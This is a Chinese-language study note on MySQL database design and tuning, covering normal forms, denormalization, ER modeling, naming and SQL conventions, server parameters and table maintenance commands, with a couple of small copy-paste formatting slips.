<h4 id="4NF（第四范式）"><a href="#4NF（第四范式）" class="headerlink" title="4NF（第四范式）"></a><strong>4NF（第四范式）</strong></h4><p><strong>定义</strong>：在满足 BCNF 的基础上，消除<strong>多值依赖</strong>。<br><strong>要求</strong>：  </p>
<ol>
<li>表必须已经满足 BCNF。  </li>
<li>同一主键下，不能有多个独立的多值属性。</li>
</ol>
<p><strong>示例</strong>（未满足 4NF）：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Course</th>
<th>Hobby</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math</td>
<td>Reading</td>
</tr>
<tr>
<td>1</td>
<td>Math</td>
<td>Music</td>
</tr>
</tbody></table>
<p><strong>问题</strong>：<code>Course</code> 和 <code>Hobby</code> 是独立的多值属性。<br><strong>满足 4NF 后</strong>：<br>拆分为两张表：  </p>
<ol>
<li><p><strong>Student-Course 表</strong>：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Course</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Math</td>
</tr>
</tbody></table>
</li>
<li><p><strong>Student-Hobby 表</strong>：  </p>
<table>
<thead>
<tr>
<th>Student_ID</th>
<th>Hobby</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Reading</td>
</tr>
</tbody></table>
</li>
</ol>
<p>| 1          | Music   |</p>
<hr>
<h4 id="5NF（第五范式）"><a href="#5NF（第五范式）" class="headerlink" title="5NF（第五范式）"></a><strong>5NF（第五范式）</strong></h4><p><strong>定义</strong>：在满足 4NF 的基础上，消除<strong>连接依赖（Join Dependency）</strong>，确保表不能再无损分解。<br><strong>要求</strong>：  </p>
<ol>
<li>表必须已经满足 4NF。  </li>
<li>数据表的分解不能导致数据丢失。</li>
</ol>
<p><strong>示例</strong>：<br>涉及复杂多对多关系的情况，一般很少直接使用。</p>
<hr>
<h3 id="反范式"><a href="#反范式" class="headerlink" title="反范式"></a>反范式</h3><p>遵循性能优先原则，若严格按照范式，可能产生大量的关联查询，影响性能。</p>
<h4 id="反范式的新问题"><a href="#反范式的新问题" class="headerlink" title="反范式的新问题"></a>反范式的新问题</h4><ul>
<li>存储 空间变大 了</li>
<li>一个表中字段做了修改，另一个表中冗余的字段也需要做同步修改，否则 数据不一致</li>
<li>若采用存储过程来支持数据的更新、删除等额外操作，如果更新频繁，会非常 消耗系统资源</li>
<li>在 数据量小 的情况下，反范式不能体现性能的优势，可能还会让数据库的设计更加 复杂</li>
</ul>
<h4 id="反范式的适用场景"><a href="#反范式的适用场景" class="headerlink" title="反范式的适用场景"></a>反范式的适用场景</h4><p>当冗余信息有价值或者能 大幅度提高查询效率 的时候，我们才会采取反范式的优化。</p>
<ol>
<li>增加冗余字段的建议</li>
<li>历史快照、历史数据的需要<br> 在现实生活中，我们经常需要一些冗余信息，比如订单中的收货人信息，包括姓名、电话和地址等。每次发生的 订单收货信息 都属于 历史快照 ，需要进行保存，但用户可以随时修改自己的信息，这时保存这些冗余信息是非常有必要的。</li>
<li>反范式优化也常用在 数据仓库 的设计中，因为数据仓库通常 存储历史数据 ，对增删改的实时性要求不强，对历史数据的分析需求强。这时适当允许数据的冗余度，更方便进行数据分析。</li>
</ol>
<h3 id="ER模型"><a href="#ER模型" class="headerlink" title="ER模型"></a>ER模型</h3><p><strong>ER模型</strong>（Entity-Relationship Model，实体-关系模型）是一种用于<strong>数据建模</strong>的图形化方法，通常用于设计数据库的概念模型。通过描述<strong>实体</strong>（Entity）、<strong>属性</strong>（Attribute）、以及实体之间的<strong>关系</strong>（Relationship），它可以帮助我们直观地理解数据库的逻辑结构。</p>
<hr>
<h4 id="ER模型的基本组成部分"><a href="#ER模型的基本组成部分" class="headerlink" title="ER模型的基本组成部分"></a><strong>ER模型的基本组成部分</strong></h4><ol>
<li><strong>实体（Entity）</strong><ul>
<li><strong>定义</strong>：指现实世界中的事物、对象、或概念，通常是可以被区分的独立存在。</li>
<li><strong>分类</strong>：<ul>
<li><strong>强实体（Strong Entity）</strong>：具有唯一标识的实体，例如“学生”有学号作为主键。</li>
<li><strong>弱实体（Weak Entity）</strong>：依赖于其他实体，没有唯一标识符，例如“订单明细”依赖于“订单”。</li>
</ul>
</li>
<li><strong>表示方式</strong>：用<strong>矩形框</strong>表示实体。</li>
</ul>
</li>
<li><strong>属性（Attribute）</strong><ul>
<li><strong>定义</strong>：指实体或关系的特征或性质。</li>
<li><strong>分类</strong>：<ul>
<li><strong>简单属性</strong>：不能再分解的属性，例如姓名。</li>
<li><strong>复合属性</strong>：可以进一步分解的属性，例如地址包含国家、省、市等。</li>
<li><strong>多值属性</strong>：可以有多个值的属性，例如电话号码。</li>
<li><strong>派生属性</strong>：从其他属性推导而来的属性，例如年龄可以由出生日期计算得出。</li>
</ul>
</li>
<li><strong>表示方式</strong>：用<strong>椭圆</strong>表示属性，连接到实体或关系。</li>
</ul>
</li>
<li><strong>关系（Relationship）</strong><ul>
<li><strong>定义</strong>：描述两个或多个实体之间的联系。</li>
<li><strong>分类</strong>：<ul>
<li><strong>一对一（1:1）</strong>：一个实体只能和另一个实体关联，例如“人”和“身份证”。</li>
<li>一对多（1:M）：一个实体可以和多个实体关联，例如“班级”和“学生”。</li>
<li>多对多（M:M）：多个实体可以互相关联，例如“学生”和“课程”。</li>
</ul>
</li>
<li><strong>表示方式</strong>：用<strong>菱形</strong>表示关系，连接相关的实体。</li>
</ul>
</li>
</ol>
<h4 id="ER模型和数据表的转换"><a href="#ER模型和数据表的转换" class="headerlink" title="ER模型和数据表的转换"></a>ER模型和数据表的转换</h4><ol>
<li><p>一个实体对应一个表，先转换强实体</p>
</li>
<li><p>一个多对多关系转换为一个数据表</p>
</li>
<li><p>通过外键表达1对多的关系</p>
<blockquote>
<p>外键约束应当尽可能少使用，通过业务逻辑实现</p>
</blockquote>
</li>
<li><p>把属性转换为表的字段</p>
</li>
</ol>
<h3 id="数据表的设计原则"><a href="#数据表的设计原则" class="headerlink" title="数据表的设计原则"></a>数据表的设计原则</h3><p><strong>三少一多</strong></p>
<ol>
<li><p>数据表的个数越少越好</p>
</li>
<li><p>数据表中的字段个数越少越好</p>
</li>
<li><p>数据表中的联合主键的字段个数越少越好</p>
</li>
<li><p>使用主键和外键越多越好</p>
<blockquote>
<p>这里的外键不是指表中实现外键约束，而是业务逻辑层实现外键</p>
</blockquote>
</li>
</ol>
<h3 id="数据库对象编写建议"><a href="#数据库对象编写建议" class="headerlink" title="数据库对象编写建议"></a>数据库对象编写建议</h3><h4 id="对于数据库"><a href="#对于数据库" class="headerlink" title="对于数据库"></a>对于数据库</h4><ol>
<li><p>【强制】库的名称必须控制在32个字符以内，只能使用英文字母、数字和下划线，建议以英文字母开头。</p>
</li>
<li><p>【强制】库名中英文 一律小写 ，不同单词采用 下划线 分割。须见名知意。</p>
</li>
<li><p>【强制】库的名称格式：业务系统名称_子系统名。</p>
</li>
<li><p>【强制】库名禁止使用关键字（如type,order等）。</p>
</li>
<li><p>【强制】创建数据库时必须 显式指定字符集 ，并且字符集只能是utf8或者utf8mb4。创建数据库SQL举例：CREATE DATABASE crm_fund DEFAULT CHARACTER SET ‘utf8’ ;</p>
</li>
<li><p>【建议】对于程序连接数据库账号，遵循 权限最小原则使用数据库账号只能在一个DB下使用，不准跨库。程序使用的账号 原则上不准有drop权限 。</p>
</li>
<li><p>【建议】临时库以 tmp_ 为前缀，并以日期为后缀；备份库以 bak_ 为前缀，并以日期为后缀。</p>
</li>
</ol>
<h4 id="对于表和列"><a href="#对于表和列" class="headerlink" title="对于表和列"></a>对于表和列</h4><ol>
<li><p>【强制】表和列的名称必须控制在32个字符以内，表名只能使用英文字母、数字和下划线，建议以 英文字母开头 。</p>
</li>
<li><p>【强制】 表名、列名一律小写 ，不同单词采用下划线分割。须见名知意。</p>
</li>
<li><p>【强制】表名要求有模块名强相关，同一模块的表名尽量使用 统一前缀 。比如：crm_fund_item</p>
</li>
<li><p>【强制】创建表时必须 显式指定字符集 为utf8或utf8mb4。</p>
</li>
<li><p>【强制】表名、列名禁止使用关键字（如type,order等）。</p>
</li>
<li><p>【强制】创建表时必须 显式指定表存储引擎 类型。如无特殊需求，一律为InnoDB。</p>
</li>
<li><p>【强制】建表必须有comment。</p>
</li>
<li><p>【强制】字段命名应尽可能使用表达实际含义的英文单词或 缩写 。如：公司 ID，不要使用corporation_id, 而用corp_id 即可。</p>
</li>
<li><p>【强制】布尔值类型的字段命名为 is_描述 。如member表上表示是否为enabled的会员的字段命名为 is_enabled。</p>
</li>
<li><p>【强制】禁止在数据库中存储图片、文件等大的二进制数据通常文件很大，短时间内造成数据量快速增长，数据库进行数据库读取时，通常会进行大量的随机IO操作，文件很大时，IO操作很耗时。通常存储于文件服务器，数据库只存储文件地址信息。</p>
</li>
<li><p>【建议】建表时关于主键： 表必须有主键 (1)强制要求主键为id，类型为int或bigint，且为auto_increment 建议使用unsigned无符号型。 (2)标识表里每一行主体的字段不要设为主键，建议设为其他字段如user_id，order_id等，并建立unique key索引。因为如果设为主键且主键值为随机插入，则会导致innodb内部页分裂和大量随机I&#x2F;O，性能下降。</p>
</li>
<li><p>【建议】核心表（如用户表）必须有行数据的 创建时间字段 （create_time）和 最后更新时间字段（update_time），便于查问题。</p>
</li>
<li><p>【建议】表中所有字段尽量都是 NOT NULL 属性，业务可以根据需要定义 DEFAULT值 。 因为使用NULL值会存在每一行都会占用额外存储空间、数据迁移容易出错、聚合函数计算结果偏差等问<br>题。</p>
</li>
<li><p>【建议】所有存储相同数据的 列名和列类型必须一致 （一般作为关联列，如果查询时关联列类型不一致会自动进行数据类型隐式转换，会造成列上的索引失效，导致查询效率降低）。</p>
</li>
<li><p>【建议】中间表（或临时表）用于保留中间结果集，名称以 tmp_ 开头。备份表用于备份或抓取源表快照，名称以 bak_ 开头。中间表和备份表定期清理。</p>
</li>
<li><p>【示范】一个较为规范的建表语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE user_info (</span><br><span class="line">`id` int unsigned NOT NULL AUTO_INCREMENT COMMENT &#x27;自增主键&#x27;,</span><br><span class="line">`user_id` bigint(11) NOT NULL COMMENT &#x27;用户id&#x27;,</span><br><span class="line">`username` varchar(45) NOT NULL COMMENT &#x27;真实姓名&#x27;,</span><br><span class="line">`email` varchar(30) NOT NULL COMMENT &#x27;用户邮箱&#x27;,</span><br><span class="line">`nickname` varchar(45) NOT NULL COMMENT &#x27;昵称&#x27;,</span><br><span class="line">`birthday` date NOT NULL COMMENT &#x27;生日&#x27;,</span><br><span class="line">`sex` tinyint(4) DEFAULT &#x27;0&#x27; COMMENT &#x27;性别&#x27;,</span><br><span class="line">`short_introduce` varchar(150) DEFAULT NULL COMMENT &#x27;一句话介绍自己，最多50个汉字&#x27;,</span><br><span class="line">`user_resume` varchar(300) NOT NULL COMMENT &#x27;用户提交的简历存放地址&#x27;,</span><br><span class="line">`user_register_ip` int NOT NULL COMMENT &#x27;用户注册时的源ip&#x27;,</span><br><span class="line">`create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#x27;创建时间&#x27;,</span><br><span class="line">`update_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE</span><br><span class="line">CURRENT_TIMESTAMP COMMENT &#x27;修改时间&#x27;,</span><br><span class="line">`user_review_status` tinyint NOT NULL COMMENT &#x27;用户资料审核状态，1为通过，2为审核中，3为未</span><br><span class="line">通过，4为还未提交审核&#x27;,</span><br><span class="line">    PRIMARY KEY (`id`),</span><br><span class="line">UNIQUE KEY `uniq_user_id` (`user_id`),</span><br><span class="line">KEY `idx_username`(`username`),</span><br><span class="line">KEY `idx_create_time_status`(`create_time`,`user_review_status`)</span><br><span class="line">) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT=&#x27;网站用户基本信息&#x27;</span><br></pre></td></tr></table></figure>


</li>
<li><p>【建议】创建表时，可以使用可视化工具。这样可以确保表、字段相关的约定都能设置上。实际上，我们通常很少自己写 DDL 语句，可以使用一些可视化工具来创建和操作数据库和数据表。可视化工具除了方便，还能直接帮我们将数据库的结构定义转化成 SQL 语言，方便数据库和数据表结构的导出和导入。</p>
</li>
</ol>
<h4 id="关于索引"><a href="#关于索引" class="headerlink" title="关于索引"></a>关于索引</h4><ol>
<li>【强制】InnoDB表必须主键为id int&#x2F;bigint auto_increment，且主键值 禁止被更新 。</li>
<li>【强制】InnoDB和MyISAM存储引擎表，索引类型必须为 BTREE 。</li>
<li>【建议】主键的名称以 pk_ 开头，唯一键以 uni_ 或 uk_ 开头，普通索引以 idx_ 开头，一律使用小写格式，以字段的名称或缩写作为后缀。</li>
<li>【建议】多单词组成的columnname，取前几个单词首字母，加末单词组成column_name。如:sample 表 member_id 上的索引：idx_sample_mid。</li>
<li>【建议】单个表上的索引个数 不能超过6个 。</li>
<li>【建议】在建立索引时，多考虑建立 联合索引 ，并把区分度最高的字段放在最前面。</li>
<li>【建议】在多表 JOIN 的SQL里，保证被驱动表的连接列上有索引，这样JOIN 执行效率最高。</li>
<li>【建议】建表或加索引时，保证表里互相不存在 冗余索引 。 比如：如果表里已经存在key(a,b)，则key(a)为冗余索引，需要删除</li>
</ol>
<h4 id="关于SQL编写"><a href="#关于SQL编写" class="headerlink" title="关于SQL编写"></a>关于SQL编写</h4><ol>
<li>【强制】程序端SELECT语句必须指定具体字段名称，禁止写成 *。</li>
<li>【建议】程序端insert语句指定具体字段名称，不要写成INSERT INTO t1 VALUES(…)。</li>
<li>【建议】除静态表或小表（100行以内），DML语句必须有WHERE条件，且使用索引查找。</li>
<li>【建议】INSERT INTO…VALUES(XX),(XX),(XX).. 这里XX的值不要超过5000个。 值过多虽然上线很快，但会引起主从同步延迟。</li>
<li>【建议】SELECT语句不要使用UNION，推荐使用UNION ALL，并且UNION子句个数限制在5个以内。</li>
<li>【建议】线上环境，多表 JOIN 不要超过5个表。</li>
<li>【建议】减少使用ORDER BY，和业务沟通能不排序就不排序，或将排序放到程序端去做。ORDERBY、GROUP BY、DISTINCT 这些语句较为耗费CPU，数据库的CPU资源是极其宝贵的。</li>
<li>【建议】包含了ORDER BY、GROUP BY、DISTINCT 这些查询的语句，WHERE 条件过滤出来的结果集请保持在1000行以内，否则SQL会很慢。</li>
<li>【建议】对单表的多次alter操作必须合并为一次。对于超过100W行的大表进行alter table，必须经过DBA审核，并在业务低峰期执行，多个alter需整合在一起。 因为alter table会产生 表锁 ，期间阻塞对于该表的所有写入，对于业务可能会产生极大影响。</li>
<li>【建议】批量操作数据时，需要控制事务处理间隔时间，进行必要的sleep。</li>
<li>【建议】事务里包含SQL不超过5个。因为过长的事务会导致锁数据较久，MySQL内部缓存、连接消耗过多等问题。</li>
<li>【建议】事务里更新语句尽量基于主键或UNIQUE KEY，如UPDATE… WHERE id&#x3D;XX;<br>PRIMARY KEY (<code>id</code>),<br>UNIQUE KEY <code>uniq_user_id</code> (<code>user_id</code>),<br>KEY <code>idx_username</code>(<code>username</code>),<br>KEY <code>idx_create_time_status</code>(<code>create_time</code>,<code>user_review_status</code>)<br>) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 COMMENT&#x3D;’网站用户基本信息’<br>否则会产生间隙锁，内部扩大锁定范围，导致系统性能下降，产生死锁。</li>
</ol>
<h3 id="PowerDesigner设计ER模型"><a href="#PowerDesigner设计ER模型" class="headerlink" title="PowerDesigner设计ER模型"></a>PowerDesigner设计ER模型</h3><p><a href="https://www.bilibili.com/video/BV1iq4y1u7vj?spm_id_from=333.788.player.switch&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=158">参考视频</a></p>
<hr>
<h2 id="数据库其他调优策略"><a href="#数据库其他调优策略" class="headerlink" title="数据库其他调优策略"></a>数据库其他调优策略</h2><hr>
<h3 id="如何定位调优问题"><a href="#如何定位调优问题" class="headerlink" title="如何定位调优问题"></a>如何定位调优问题</h3><ol>
<li>用户反馈</li>
<li>日志分析</li>
<li>服务器资源使用监控</li>
<li>数据库内部状况监控</li>
<li>其他</li>
</ol>
<hr>
<h3 id="调优的维度和步骤"><a href="#调优的维度和步骤" class="headerlink" title="调优的维度和步骤"></a>调优的维度和步骤</h3><h5 id="1-选择合适的DBMS"><a href="#1-选择合适的DBMS" class="headerlink" title="1.选择合适的DBMS"></a>1.选择合适的DBMS</h5><ul>
<li>对安全性和事务性处理要求高的，应当使用商业数据库管理系统，如Oracle</li>
<li>采用MySQL时应当采用合适的存储引擎。</li>
<li>或采用非关系型数据库如<code>键值型数据库</code>、<code>文档型数据库</code>，<code>搜索引擎</code>，<code>列式存储</code>，<code>图形数据库</code>。</li>
</ul>
<h5 id="2-优化表的设计"><a href="#2-优化表的设计" class="headerlink" title="2.优化表的设计"></a>2.优化表的设计</h5><ol>
<li>表应当尽量<code>遵循三范式原则</code></li>
<li>查询，尤其是<code>多表联合查询</code>较多的表，采用<code>反范式</code>优化，实现空间换取时间，通过增加冗余字段提高查询效率</li>
<li><code>表字段的数据类型</code>的选择，关系到查询效率的高低和存储空间的大小。一般而言，遵循：<ol>
<li>能采用数值型就不要采用字符型</li>
<li>字符长度应当尽可能短</li>
<li>固定长度采用char，非固定长度采用varchar</li>
</ol>
</li>
</ol>
<h5 id="3-优化逻辑查询"><a href="#3-优化逻辑查询" class="headerlink" title="3.优化逻辑查询"></a>3.优化逻辑查询</h5><p>如子查询重写，等价谓词重写，视图重写，条件简化，连接消除和嵌套连接消除等。</p>
<h5 id="4-优化物理查询"><a href="#4-优化物理查询" class="headerlink" title="4.优化物理查询"></a>4.优化物理查询</h5><p><strong>核心是索引的创建和正确使用</strong></p>
<h5 id="5-使用redis或Memcached"><a href="#5-使用redis或Memcached" class="headerlink" title="5.使用redis或Memcached"></a>5.使用redis或Memcached</h5><h5 id="6-库级优化"><a href="#6-库级优化" class="headerlink" title="6. 库级优化"></a>6. 库级优化</h5><ol>
<li><p>读写分离</p>
<p> <img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241122232904.png"></p>
</li>
<li><p>数据分片</p>
</li>
</ol>
<p>​	<img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20241122232928.png"></p>
<h3 id="优化MySQL服务器"><a href="#优化MySQL服务器" class="headerlink" title="优化MySQL服务器"></a>优化MySQL服务器</h3><p>一方面是对硬件进行优化，另一方面对MySQL服务的参数进行优化，一般需要专业的数据库管理员完成。</p>
<h4 id="优化服务器硬件"><a href="#优化服务器硬件" class="headerlink" title="优化服务器硬件"></a>优化服务器硬件</h4><ol>
<li>配置较大的内存</li>
<li>配置高速磁盘系统</li>
<li>合理分布磁盘I&#x2F;O</li>
<li>配置多处理器</li>
</ol>
<h4 id="优化MySQL参数"><a href="#优化MySQL参数" class="headerlink" title="优化MySQL参数"></a>优化MySQL参数</h4><ul>
<li><code>innodb_buffer_pool_size</code> ：这个参数是Mysql数据库最重要的参数之一，表示InnoDB类型的 表和索引的最大缓存 。它不仅仅缓存 索引数据 ，还会缓存 表的数据 。这个值越大，查询的速度就会越快。但是这个值太大会影响操作系统的性能。</li>
<li><code>key_buffer_size</code> ：表示 索引缓冲区的大小 。索引缓冲区是所有的 线程共享 。增加索引缓冲区可以得到更好处理的索引（对所有读和多重写）。当然，这个值不是越大越好，它的大小取决于内存的大小。如果这个值太大，就会导致操作系统频繁换页，也会降低系统性能。对于内存在 4GB 左右的服务器该参数可设置为 256M 或 384M 。</li>
<li><code>table_cache</code> ：表示 同时打开的表的个数 。这个值越大，能够同时打开的表的个数越多。物理内存越大，设置就越大。默认为2402，调到512-1024最佳。这个值不是越大越好，因为同时打开的表太多会影响操作系统的性能。<br>  <code>query_cache_size</code> ：表示 查询缓冲区的大小 。可以通过在MySQL控制台观察，如果Qcache_lowmem_prunes的值非常大，则表明经常出现缓冲不够的情况，就要增加Query_cache_size的值；如果Qcache_hits的值非常大，则表明查询缓冲使用非常频繁，如果该值较小反而会影响效率，那么可以考虑不用查询缓存；Qcache_free_blocks，如果该值非常大，则表明缓冲区中碎片很多。MySQL8.0之后失效。该参数需要和query_cache_type配合使用。<br>  <code>query_cache_type</code> 的值是0时，所有的查询都不使用查询缓存区。但是query_cache_type&#x3D;0并不<br>  会导致MySQL释放query_cache_size所配置的缓存区内存。<ul>
<li>当query_cache_type&#x3D;1时，所有的查询都将使用查询缓存区，除非在查询语句中指定SQL_NO_CACHE ，如SELECT SQL_NO_CACHE * FROM tbl_name。</li>
<li>当query_cache_type&#x3D;2时，只有在查询语句中使用 SQL_CACHE 关键字，查询才会使用查询缓存区。使用查询缓存区可以提高查询的速度，这种方式只适用于修改操作少且经常执行相同的查询操作的情况。</li>
</ul>
</li>
<li><code>sort_buffer_size</code>：表示每个 需要进行排序的线程分配的缓冲区的大小 。增加这个参数的值可以提高 ORDER BY 或 GROUP BY 操作的速度。默认数值是2 097 144字节（约2MB）。对于内存在4GB左右的服务器推荐设置为6-8M，如果有100个连接，那么实际分配的总共排序缓冲区大小为100 × 6＝ 600MB。</li>
<li><code>join_buffer_size = 8M </code>：表示 联合查询操作所能使用的缓冲区大小 ，和sort_buffer_size一样，该参数对应的分配内存也是每个连接独享。</li>
<li><code>read_buffer_size</code> ：表示 每个线程连续扫描时为扫描的每个表分配的缓冲区的大小（字节） 。当线程从表中连续读取记录时需要用到这个缓冲区。SET SESSION read_buffer_size&#x3D;n可以临时设置该参数的值。默认为64K，可以设置为4M。</li>
<li><code>innodb_flush_log_at_trx_commit</code> ：表示 何时将缓冲区的数据写入日志文件 ，并且将日志文件写入磁盘中。该参数对于innoDB引擎非常重要。该参数有3个值，分别为0、1和2。该参数的默认值为1。<ul>
<li>值为 0 时，表示 每秒1次 的频率将数据写入日志文件并将日志文件写入磁盘。每个事务的commit并不会触发前面的任何操作。该模式速度最快，但不太安全，mysqld进程的崩溃会导致上一秒钟所有事务数据的丢失。</li>
<li>值为 1 时，表示 每次提交事务时 将数据写入日志文件并将日志文件写入磁盘进行同步。该模式是最安全的，但也是最慢的一种方式。因为每次事务提交或事务外的指令都需要把日志写入（flush）硬盘。</li>
<li>值为 2 时，表示 每次提交事务时 将数据写入日志文件， 每隔1秒 将日志文件写入磁盘。该模<br>  式速度较快，也比0安全，只有在操作系统崩溃或者系统断电的情况下，上一秒钟所有事务数<br>  据才可能丢失。</li>
</ul>
</li>
<li><code>innodb_log_buffer_size </code>：这是 InnoDB 存储引擎的 事务日志所使用的缓冲区 。为了提高性能，也是先将信息写入 Innodb Log Buffer 中，当满足 innodb_flush_log_trx_commit 参数所设置的相应条件（或者日志缓冲区写满）之后，才会将日志写到文件（或者同步到磁盘）中。</li>
<li><code>max_connections </code>：表示 允许连接到MySQL数据库的最大数量 ，默认值是 151 。如果状态变量connection_errors_max_connections 不为零，并且一直增长，则说明不断有连接请求因数据库连接数已达到允许最大值而失败，这是可以考虑增大max_connections 的值。在Linux 平台下，性能好的服务器，支持 500-1000 个连接不是难事，需要根据服务器性能进行评估设定。这个连接数 不是越大越好 ，因为这些连接会浪费内存的资源。过多的连接可能会导致MySQL服务器僵死。</li>
<li><code>back_log </code>：用于 控制MySQL监听TCP端口时设置的积压请求栈大小 。如果MySql的连接数达到max_connections时，新来的请求将会被存在堆栈中，以等待某一连接释放资源，该堆栈的数量即back_log，如果等待连接的数量超过back_log，将不被授予连接资源，将会报错。5.6.6 版本之前默认值为 50 ， 之后的版本默认为 50 + （max_connections &#x2F; 5）， 对于Linux系统推荐设置为小于512的整数，但最大不超过900。如果需要数据库在较短的时间内处理大量连接请求， 可以考虑适当增大back_log 的值。</li>
<li><code>thread_cache_size</code> ： 线程池缓存线程数量的大小 ，当客户端断开连接后将当前线程缓存起来，当在接到新的连接请求时快速响应无需创建新的线程 。这尤其对那些使用短连接的应用程序来说可以极大的提高创建连接的效率。那么为了提高性能可以增大该参数的值。默认为60，可以设置为120。</li>
<li><code>wait_timeout</code> ：指定 一个请求的最大连接时间 ，对于4GB左右内存的服务器可以设置为5-10。</li>
<li><code>interactive_timeout</code>：表示服务器在关闭连接前等待行动的秒数。</li>
</ul>
<p><a href="https://www.bilibili.com/video/BV1iq4y1u7vj/?spm_id_from=333.788.videopod.episodes&vd_source=20530c92c1be8bd70e37346e3a5c037a&p=159">参考实例</a></p>
<h3 id="优化数据库结构"><a href="#优化数据库结构" class="headerlink" title="优化数据库结构"></a>优化数据库结构</h3><ol>
<li>拆分表：冷热数据分离</li>
<li>增加中间表</li>
<li>增加冗余字段（反范式化）</li>
<li>优化数据类型：<ul>
<li>整数类型数据优化<ul>
<li>整数字段类型优先使用<code>INT</code></li>
<li>非负型数据优先使用无符号整型<code>UNSIGNED</code></li>
</ul>
</li>
<li>既可以使用文本类型也可以使用整数类型的字段，要选择使用整数类型。</li>
<li>避免使用TEXT、BLOB数据类型</li>
<li>避免使用ENUM类型</li>
<li>使用TIMESTAMP存储时间</li>
<li>用DECIMAL代替FLOAT和DOUBLE存储精确浮点数</li>
</ul>
</li>
<li>优化插入记录的速度<ol>
<li>MyISAM引擎的表：<ol>
<li>禁用索引</li>
<li>禁用唯一性检查</li>
<li>使用批量插入</li>
<li>使用LOAD DATA INFILE 批量导入</li>
</ol>
</li>
<li>InnoDB引擎<ol>
<li>禁止唯一性检查</li>
<li>禁止外键检查</li>
<li>禁止自动提交</li>
</ol>
</li>
</ol>
</li>
<li>使用非空约束</li>
</ol>
<h4 id="分析表，检查表和优化表"><a href="#分析表，检查表和优化表" class="headerlink" title="分析表，检查表和优化表"></a>分析表，检查表和优化表</h4><p>MySQL提供了分析表、检查表和优化表的语句，分析表用于分析关键字的分布，检查表检查表是否存在错误，优化表消除删除或更新造成的空间浪费</p>
<h5 id="分析表"><a href="#分析表" class="headerlink" title="**分析表 **"></a>**分析表 **</h5><p>基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ANALYZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name[,tbl_name]</span><br></pre></td></tr></table></figure>

<p>在分析表的过程中，会对表添加<code>只读锁</code>，因此不能更新和插入数据。ANALYZE TABLE语句能够分析InnoDB和MyISAM类型的表，但是不能作用于视图。</p>
<p>ANALYZE TABLE分析后的统计结果会反应到<code>cardinality</code>的值，该值统计了表中某一键所在的列不重复的值的个数。<strong>该值越接近表中的总行数，则在表连接查询或者索引查询时，就越优先被优化器选择使用</strong>。</p>
<h5 id="检查表"><a href="#检查表" class="headerlink" title="检查表"></a>检查表</h5><p>基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CHECK TABLE tbl_name [, tbl_name] ... [option] ...</span><br><span class="line">option = &#123;QUICK | FAST | MEDIUM | EXTENDED | CHANGED&#125;</span><br></pre></td></tr></table></figure>

<p>CHECK TABLE语句在执行过程中也会给表加上 <code>只读锁</code> </p>
<p>能够检查InnoDB和MyISAM类型的表是否存在错误，对于MyISAM类型的表，CHECK TABLE语句还会更新关键字统计数据。而且，CHECK TABLE也可以检查视图是否有错误，比如在视图定义中被引用的表已不存在。</p>
<p>其中，tbl_name是表名；option参数有5个取值，分别是QUICK、FAST、MEDIUM、EXTENDED和CHANGED。各个选项的意义分别是：</p>
<ul>
<li>QUICK ：不扫描行，不检查错误的连接。</li>
<li>FAST ：只检查没有被正确关闭的表。</li>
<li>CHANGED ：只检查上次检查后被更改的表和没有被正确关闭的表。</li>
<li>MEDIUM ：扫描行，以验证被删除的连接是有效的。也可以计算各行的关键字校验和，并使用计算<br>  出的校验和验证这一点。</li>
<li>EXTENDED ：对每行的所有关键字进行一个全面的关键字查找。这可以确保表是100%一致的，但<br>  是花的时间较长。</li>
</ul>
<p>option只对MyISAM类型的表有效，对InnoDB类型的表无效。</p>
<h5 id="优化表"><a href="#优化表" class="headerlink" title="优化表"></a>优化表</h5><p><strong>方式1：OPTIMIZE TABLE</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OPTIMIZE [LOCAL | NO_WRITE_TO_BINLOG] TABLE tbl_name [, tbl_name] ...</span><br></pre></td></tr></table></figure>

<p>OPTILMIZE TABLE语句只能优化表中的VARCHAR 、 BLOB 或 TEXT 类型的字段。一个表使用了这些字段的数据类型，若已经删除了表的一大部分数据，或者已经对含有可变长度行的表（含有VARCHAR、BLOB或TEXT列的表）进行了很多更新 ，则应使用OPTIMIZE TABLE来重新利用未使用的空间，并整理数据文件的 碎片 。OPTIMIZE TABLE 语句对InnoDB和MyISAM类型的表都有效。该语句在执行过程中也会给表加上 <code>只读锁</code> 。</p>
<p><strong>方法2：使用mysqlcheck命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqlcheck -o DatabaseName tablename -u root -p *******</span><br></pre></td></tr></table></figure>



<h3 id="大表优化"><a href="#大表优化" class="headerlink" title="大表优化"></a>大表优化</h3><ol>
<li><strong>限定查询的范围：</strong>禁止不带任何限制数据范围条件的查询语句。</li>
<li><strong>读写分离：</strong>主库负责写，从库负责读，利用主从复制。包括一主一从，双主双从等模式</li>
<li><strong>垂直拆分：</strong>当数据量达到千万级以上时，可能就需要采用垂直拆分。包括<code>垂直分库</code>（一个数据库按功能模块分成多份，存储在不同的数据库服务器上，关联表在同一个数据库中）和<code>垂直分表</code>（将一张数据表拆分为多张，经常一起使用的列就放在一起）</li>
<li><strong>水平拆分</strong><ul>
<li>尽量控制单表的数据量在<code>1000万以内</code>，可以采用历史数据分档（用于日志数据）或水平分表（用于业务数据）等。</li>
<li>水平拆分最好分库。</li>
<li>水平拆分能够支持非常大的数据量存储，应用端改造也小，但分片事务难以解决，跨节点Join性能差，逻辑复杂。部分专家<strong>建议不要对数据进行分片以避免带来逻辑，部署和运维上的复杂度</strong></li>
</ul>
</li>
